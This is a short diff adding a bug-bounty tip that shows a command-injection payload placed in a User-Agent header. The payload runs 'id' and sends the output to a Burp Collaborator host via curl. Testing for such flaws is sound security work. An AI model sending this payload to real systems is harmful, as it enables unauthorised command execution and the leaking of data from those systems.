@@ -34,6 +34,11 @@
     
    [Hackerone report](https://hackerone.com/reports/403417)
    
+## TIP-5 
+```bash
+    User-Agent: `curl - v http://BurpCollaborator.com$(id)`
+ # Get command injection
+ ```
    
    
    
